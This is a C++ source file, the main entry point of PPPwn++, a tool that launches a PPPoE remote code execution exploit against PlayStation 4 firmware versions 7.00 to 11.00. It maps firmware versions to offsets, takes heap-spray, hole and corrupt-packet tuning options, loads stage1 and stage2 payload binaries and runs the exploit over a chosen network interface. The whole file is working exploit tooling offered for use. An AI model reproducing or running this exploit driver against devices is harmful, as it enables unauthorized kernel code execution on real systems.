#include <iostream>
#include <fstream>
#include <unordered_map>
#include <vector>
#include <string>
#include <PcapLiveDeviceList.h>
#include <clipp.h>

#define COLOR_ERROR "\033[1;31m"  // Bold Red
#define BOLD_CYAN    "\033[1;36m"
#define BOLD_MAGENTA "\033[1;35m" 
#define BLINK_RED    "\033[5;31m"

#define COLOR_RED     "\033[31m"
#define COLOR_GREEN   "\033[32m"
#define COLOR_YELLOW  "\033[33m"
#define COLOR_BLUE    "\033[34m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_CYAN    "\033[36m"
#define COLOR_WHITE   "\033[37m"


#define COLOR_BOLD    "\033[1m"
#define COLOR_HEADER  "\033[36m"  // Cyan
#define COLOR_LABEL   "\033[32m"  // Green
#define COLOR_VALUE   "\033[33m"  // Yellow
#define COLOR_HEX     "\033[35m"  // Magenta
#define COLOR_FLAG_ON "\033[31m"  // Red
#define COLOR_FLAG_OFF "\033[34m" // Blue
#define COLOR_SPECIAL "\033[93m"  // Bright Yellow

#define COLOR_BOLD    "\033[1m"
#define COLOR_BLINK   "\033[5m"
#define COLOR_RED     "\033[31m"
#define COLOR_RESET   "\033[0m"

// Combined bold + blink + red
#define COLOR_ERROR2   COLOR_BOLD COLOR_BLINK COLOR_RED

#if defined(__APPLE__)

#include <SystemConfiguration/SystemConfiguration.h>

#endif

#include "exploit.h"
#include "web.h"

int spray_num = 0x1000;
int pin_num = 0x1000;
int corrupt_num = 0x1;
int hole_start = 0x400;
int hole_space = 0x10;
std::string SOURCE_IPV6 = "fe80::9f9f:41ff:9f9f:41ff";
long long sin6_addr_pt2 = 0x9f9f41ff9f9f41ffLL;

std::vector<uint8_t> readBinary(const std::string &filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file) {
        std::cout << COLOR_ERROR2 << "[ERROR] Cannot open: " << COLOR_RESET << filename << std::endl;
        return {};
    }

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<uint8_t> buffer(size);
    if (!file.read(reinterpret_cast<char *>(buffer.data()), size)) {
        std::cout << COLOR_ERROR2 << "[ERROR] Cannot read: " << COLOR_RESET << filename << std::endl;
        return {};
    }

    return buffer;
}

void listInterfaces() {
    std::cout << "[+] interfaces: " << std::endl;
#if defined(__APPLE__)
    CFArrayRef interfaces = SCNetworkInterfaceCopyAll();
    if (!interfaces) {
        std::cerr << COLOR_ERROR2 << "[ERROR] Failed to get interfaces" << COLOR_RESET << std::endl;
        exit(1);
    }
    CFIndex serviceCount = CFArrayGetCount(interfaces);
    char buffer[1024];
    for (CFIndex i = 0; i < serviceCount; ++i) {
        auto interface = (SCNetworkInterfaceRef) CFArrayGetValueAtIndex(interfaces, i);
        auto serviceName = SCNetworkInterfaceGetLocalizedDisplayName(interface);
        auto bsdName = SCNetworkInterfaceGetBSDName(interface);
        if (bsdName) {
            CFStringGetCString(bsdName, buffer, sizeof(buffer), kCFStringEncodingUTF8);
            printf("\t%s ", buffer);
            if (serviceName) {
                CFStringGetCString(serviceName, buffer, sizeof(buffer), kCFStringEncodingUTF8);
                printf("%s", buffer);
            }
            printf("\n");
        }
    }
    CFRelease(interfaces);
#else
    std::vector<pcpp::PcapLiveDevice *> devList = pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDevicesList();
    for (pcpp::PcapLiveDevice *dev: devList) {
        if (dev->getLoopback()) continue;
        std::cout << "\t" << dev->getName() << " " << dev->getDesc() << std::endl;
    }
#endif
    exit(0);
}

enum FirmwareVersion getFirmwareOffset(int fw) {
    std::unordered_map<int, enum FirmwareVersion> fw_choices = {
            {700,  FIRMWARE_700_702},
            {701,  FIRMWARE_700_702},
            {702,  FIRMWARE_700_702},
            {750,  FIRMWARE_750_755},
            {750,  FIRMWARE_750_755},
            {751,  FIRMWARE_750_755},
            {755,  FIRMWARE_750_755},
            {800,  FIRMWARE_800_803},
            {801,  FIRMWARE_800_803},
            {803,  FIRMWARE_800_803},
            {850,  FIRMWARE_850_852},
            {852,  FIRMWARE_850_852},
            {900,  FIRMWARE_900},
            {903,  FIRMWARE_903_904},
            {904,  FIRMWARE_903_904},
            {950,  FIRMWARE_950_960},
            {951,  FIRMWARE_950_960},
            {960,  FIRMWARE_950_960},
            {1000, FIRMWARE_1000_1001},
            {1001, FIRMWARE_1000_1001},
            {1050, FIRMWARE_1050_1071},
            {1070, FIRMWARE_1050_1071},
            {1071, FIRMWARE_1050_1071},
            {1100, FIRMWARE_1100}
    };
    if (fw_choices.count(fw) == 0) return FIRMWARE_UNKNOWN;
    return fw_choices[fw];
}

#define SUPPORTED_FIRMWARE "{700,701,702,750,751,755,800,801,803,850,852,900,903,904,950,951,960,1000,1001,1050,1070,1071,1100} (default: 1100)"

static std::shared_ptr<Exploit> exploit = std::make_shared<Exploit>();
static std::shared_ptr<WebPage> web = nullptr;

static void signal_handler(int sig_num) {
    signal(sig_num, signal_handler);
    if (web) web->stop();
    exploit->ppp_byebye();
    exit(sig_num);
}

// u bet ur ass i didn't write this
bool isInteger(const std::string& str) {
    return !str.empty() && std::all_of(str.begin(), str.end(), [](char c) {
        return std::isdigit(static_cast<unsigned char>(c));
    });
}

bool parsenums(std::string& argstring, int& argnum, int defaultVal) {
    if(argstring.empty()) {
        argnum = defaultVal;
        return true;
    }
    
    try {
        if (argstring.size() >= 2 && argstring.compare(0, 2, "0x") == 0) {
            argnum = std::stoi(argstring.substr(2), nullptr, 16);
        } else if (isInteger(argstring)) {
            argnum = std::stoi(argstring, nullptr, 10);
        } else {
            std::cerr << COLOR_ERROR2 << "[ERROR] Invalid number format: " << COLOR_RESET << argstring << std::endl;
            return false;
        }
        return true;
    } catch (const std::exception& e) {
        std::cerr << COLOR_ERROR2 << "[ERROR] Error parsing number: " << COLOR_RESET << std::endl;
        return false;
    }
}

bool validateParameters(int spray_num, int hole_start, int hole_space) {
    if (spray_num <= 0 || spray_num > 0x10000) {
        std::cerr << COLOR_ERROR2 << "[ERROR] Invalid SPRAY_NUM value (must be between 1 and 65536)" << COLOR_RESET << std::endl;
        return false;
    }
    if (hole_start < 0 || hole_start >= spray_num) {
        std::cerr << "\033[1;5;31m[ERROR] HOLE_START must be in the range [0, " 
          << (spray_num - 1) << "]\033[0m" << std::endl;
        std::cerr << "\033[1;5;31m[ERROR] HOLE_START must be less than SPRAY_NUM\033[0m" << std::endl;
        return false;
    }
    if (hole_start >= spray_num) {
        std::cerr << "\033[1;5;31m[ERROR] HOLE_START must be less than SPRAY_NUM\033[0m" << std::endl;
        return false;
    }
    if (hole_space <= 0 || hole_space > 0x100) {
        std::cerr << "\033[1;5;31m[ERROR] Invalid HOLE_SPACE value (must be between 1 and 256)\033[0m" << std::endl;
        return false;
    }
    if (hole_start + hole_space > spray_num) {
        std::cerr << "\033[1;5;31m[ERROR] Hole (HOLE_START + HOLE_SPACE) exceeds SPRAY_NUM\033[0m" << std::endl;
        return false;
    }
    return true;
}

int main(int argc, char *argv[]) {
    using namespace clipp;
    std::cout << "\033[1;36m"  // Bold Cyan
          << R"(
╔════════════════════════════════════════╗
║   )" 
          << "\033[1;35m"  // Bold Magenta
          << "PPPwn++ - PlayStation 4 PPPoE RCE" 
          << "\033[1;36m"  // Bold Cyan
          << R"(    ║
╚════════════════════════════════════════╝
)" 
          << "\033[0;33m"  // Yellow
          << "           by " 
          << "\033[5;31m"  // Blinking Red
          << "theflow" 
          << "\033[0m"     // Reset
          << std::endl;
    std::string interface, stage1 = "stage1/stage1.bin", stage2 = "stage2/stage2.bin";
    std::string web_url = "0.0.0.0:7796";
    int fw = 1100;
    int timeout = 0;
    int wait_after_pin = 1;
    int groom_delay = 4;
    int buffer_size = 0;
    int hole_start = 0x400;
    int hole_space = 0x10;
    int corrupt_delay = 0;  // Default: no delay
    int post_corrupt_delay = 0;  // Default: No delay
    bool retry = false;
    bool no_wait_padi = false;
    bool web_page = false;
    bool real_sleep = false;
    std::string spray_num_str = "";
    std::string pin_num_str = "";
    std::string corrupt_num_str = "";
    std::string custom_ipv6 = "";
    std::string hole_start_str = "";
    std::string hole_space_str = "";
    std::string corrupt_delay_str = "";
    std::string post_corrupt_delay_str = "";

    auto cli = (
            ("network interface" % required("-i", "--interface") & value("interface", interface), \
            SUPPORTED_FIRMWARE % option("--fw") & integer("fw", fw), \
            "stage1 binary (default: stage1/stage1.bin)" % option("-s1", "--stage1") & value("STAGE1", stage1), \
            "stage2 binary (default: stage2/stage2.bin)" % option("-s2", "--stage2") & value("STAGE2", stage2), \
            "timeout in seconds for ps4 response, 0 means always wait (default: 0)" %
            option("-t", "--timeout") & integer("seconds", timeout), \
            "Waiting time in seconds after the first round CPU pinning (default: 1)" %
            option("-wap", "--wait-after-pin") & integer("seconds", wait_after_pin), \
            "wait for 1ms every `n` rounds during Heap grooming (default: 4)" % option("-gd", "--groom-delay") &
            integer("1-4097", groom_delay), \
            "PCAP buffer size in bytes, less than 100 indicates default value (usually 2MB)  (default: 0)" %
            option("-bs", "--buffer-size") & integer("bytes", buffer_size), \
            "SPRAY_NUM is definitely a variable. Enter in hex OR decimal. (Default: 0x1000 / 4096)" %
            option("-sn", "--spray-num") & value("size", spray_num_str), \
            "PIN_NUM also does something, though i have no idea what. Enter in hex OR decimal. (Default: 0x1000 or 4096)" %
            option("-pn", "--pin-num") & value("pin", pin_num_str), \
            "HOLE_START determines where to start creating holes in heap (Default: 0x400)" %
            option("-hs", "--hole-start") & value("size", hole_start_str), \
            "HOLE_SPACE determines spacing between holes in heap (Default: 0x10)" %
            option("-hsp", "--hole-space") & value("size", hole_space_str), \
            "CORRUPT_NUM is the amount of overflow packets sent to the PS4. Enter in hex OR decimal. (Default: 0x1 or 1)" %
            option("-cn", "--corrupt-num") & value("size", corrupt_num_str), \
            "Delay in seconds between sending corrupt packets (Default: 0)" %
            option("-cd", "--corrupt-delay") & value("delay", corrupt_delay_str), \
            "Delay in seconds after sending corrupt packets (Default: 0)" %
            option("-pcd", "--post-corrupt-delay") & value("seconds", post_corrupt_delay_str),
            "use your own ipv6. doesn't check for correct formatting, use with caution.\n" %
            option("--ipv6") & value("ipv6", custom_ipv6), \
            "automatically retry when fails or timeout" %
            option("-a", "--auto-retry").set(retry), \
            "don't wait one more PADI before starting" %
            option("-nw", "--no-wait-padi").set(no_wait_padi), \
            "Use CPU for more precise sleep time (Only used when execution speed is too slow)" %
            option("-rs", "--real-sleep").set(real_sleep), \
            "start a web page" % option("--web").set(web_page), \
            "custom web page url (default: 0.0.0.0:7796)" % option("--url") & value("url", web_url)
            ) | \
            "list interfaces" % command("list").call(listInterfaces)
    );

    auto result = parse(argc, argv, cli);
    if (!result) {
        std::cout << make_man_page(cli, "pppwn");
        return 1;
    }

    auto offset = getFirmwareOffset(fw);
    if (offset == FIRMWARE_UNKNOWN) {
        std::cerr << COLOR_ERROR2 << "❌ Invalid firmware version" << COLOR_RESET << std::endl;
        std::cout << make_man_page(cli, "pppwn");
        return 1;
    }

    parsenums(spray_num_str,spray_num,0x1000);
    parsenums(pin_num_str,pin_num,0x1000);
    parsenums(corrupt_num_str,corrupt_num,0x1);
    parsenums(hole_start_str, hole_start, 0x400);
    parsenums(hole_space_str, hole_space, 0x10);
    parsenums(corrupt_delay_str, corrupt_delay, 0);
    parsenums(post_corrupt_delay_str, post_corrupt_delay, 0);  // Default: 0s

    std::cout << COLOR_HEADER << "╔════════════════════════════════════════╗\n"
          << "║        Updated @iamWitchking           ║\n"
          << "╚════════════════════════════════════════╝\n" << COLOR_RESET
          << "  " << COLOR_LABEL << "🌐 Network:" << COLOR_RESET << "\n"
          << "    interface=" << COLOR_VALUE << interface << COLOR_RESET << "  "
          << "fw=" << COLOR_VALUE << fw << COLOR_RESET << "  "
          << "ipv6=" << COLOR_SPECIAL << SOURCE_IPV6 << COLOR_RESET << "\n"
          << "  " << COLOR_LABEL << "Stages:" << COLOR_RESET << "\n"
          << "    stage1=" << COLOR_VALUE << stage1 << COLOR_RESET << "  "
          << "stage2=" << COLOR_VALUE << stage2 << COLOR_RESET << "\n"
          << "  " << COLOR_LABEL << "⏱️ Timing:" << COLOR_RESET << "\n"
          << "    timeout=" << COLOR_VALUE << timeout << COLOR_RESET << "  "
          << "wait-after-pin=" << COLOR_VALUE << wait_after_pin << COLOR_RESET << "  "
          << "groom-delay=" << COLOR_VALUE << groom_delay << COLOR_RESET << "\n"
          << "    wait-after-corrupt=" << COLOR_VALUE << post_corrupt_delay << "s" << COLOR_RESET << "\n"
          << "  " << COLOR_LABEL << "🏁 Flags:" << COLOR_RESET << "\n"
          << "    auto-retry=" << (retry ? COLOR_FLAG_ON : COLOR_FLAG_OFF) << (retry ? "on" : "off") << COLOR_RESET << "  "
          << "no-wait-padi=" << (no_wait_padi ? COLOR_FLAG_ON : COLOR_FLAG_OFF) << (no_wait_padi ? "on" : "off") << COLOR_RESET << "  "
          << "real_sleep=" << (real_sleep ? COLOR_FLAG_ON : COLOR_FLAG_OFF) << (real_sleep ? "on" : "off") << COLOR_RESET << "\n"
          << "  " << COLOR_LABEL << "💾 Memory:" << COLOR_RESET << "\n"
          << "    SPRAY=" << COLOR_VALUE << spray_num << COLOR_RESET << " (" << COLOR_HEX << "0x" << std::hex << spray_num << COLOR_RESET << ")  "
          << "PIN=" << COLOR_VALUE << std::dec << pin_num << COLOR_RESET << " (" << COLOR_HEX << "0x" << std::hex << pin_num << COLOR_RESET << ")\n"
          << "    CORRUPT=" << COLOR_VALUE << std::dec << corrupt_num << COLOR_RESET << " (" << COLOR_HEX << "0x" << std::hex << corrupt_num << COLOR_RESET << ")  "
          << "Corrupt delay between each sending=" << COLOR_VALUE << corrupt_delay << "s" << COLOR_RESET << "\n"
          << "    HOLE_START=" << COLOR_VALUE << hole_start << COLOR_RESET << " (" << COLOR_HEX << "0x" << std::hex << hole_start << COLOR_RESET << ") "
          << "HOLE_SPACE=" << COLOR_VALUE << hole_space << COLOR_RESET << " (" << COLOR_HEX << "0x" << std::hex << hole_space << COLOR_RESET << ") "
          << std::endl;

    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    if (!validateParameters(spray_num, hole_start, hole_space)) {
    return 1;
    }
    if (exploit->setFirmwareVersion((FirmwareVersion) offset)) return 1;
    if (exploit->setInterface(interface, buffer_size)) return 1;
    auto stage1_data = readBinary(stage1);
    if (stage1_data.empty()) return 1;
    auto stage2_data = readBinary(stage2);
    if (stage2_data.empty()) return 1;

    // set options
    std::cout << "custom ipv6 (main.cpp): " << custom_ipv6 << std::endl;
    std::cout << "SOURCE_IPV6 (main.cpp): " << SOURCE_IPV6 << std::endl;
    if(!custom_ipv6.empty())
        exploit->setIpv6(custom_ipv6);
    else
        exploit->setIpv6("fe80::9f9f:41ff:9f9f:41ff");
    exploit->setStage1(std::move(stage1_data));
    exploit->setStage2(std::move(stage2_data));
    exploit->setTimeout(timeout);
    exploit->setWaitPADI(!no_wait_padi);
    exploit->setGroomDelay(groom_delay);
    exploit->setWaitAfterPin(wait_after_pin);
    exploit->setAutoRetry(retry);
    exploit->setRealSleep(real_sleep);
    exploit->setHoleStart(hole_start);
    exploit->setHoleSpace(hole_space);
    exploit->setCorruptDelay(corrupt_delay);

    if (web_page) {
        web = std::make_shared<WebPage>(exploit);
        web->setUrl(web_url);
        web->run();
        return 0;
    }

    return exploit->run();
}
